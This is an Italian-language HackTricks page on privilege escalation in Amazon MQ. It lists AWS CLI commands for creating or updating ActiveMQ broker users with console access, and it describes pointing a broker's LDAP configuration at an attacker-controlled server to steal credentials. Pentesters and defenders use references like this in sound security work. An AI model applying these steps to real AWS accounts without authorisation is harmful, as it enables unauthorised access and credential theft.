# AWS - MQ Privesc

{{#include ../../../banners/hacktricks-training.md}}

## MQ

Per ulteriori informazioni su MQ controlla:

{{#ref}}
../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Con questi permessi puoi **creare un nuovo utente in un broker ActimeMQ** (questo non funziona in RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impatto Potenziale:** Accesso a informazioni sensibili navigando attraverso ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Con questi permessi puoi **creare un nuovo utente in un broker ActiveMQ** (questo non funziona in RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impatto Potenziale:** Accesso a informazioni sensibili navigando attraverso ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Se un broker utilizza **LDAP** per l'autorizzazione con **ActiveMQ**, è possibile **cambiare** la **configurazione** del server LDAP utilizzato con **uno controllato dall'attaccante**. In questo modo, l'attaccante sarà in grado di **rubare tutte le credenziali inviate tramite LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Se in qualche modo riuscissi a trovare le credenziali originali utilizzate da ActiveMQ, potresti eseguire un MitM, rubare le credenziali, utilizzarle nel server originale e inviare la risposta (forse semplicemente riutilizzando le credenziali rubate potresti farlo).

**Impatto Potenziale:** Rubare le credenziali di ActiveMQ

{{#include ../../../banners/hacktricks-training.md}}
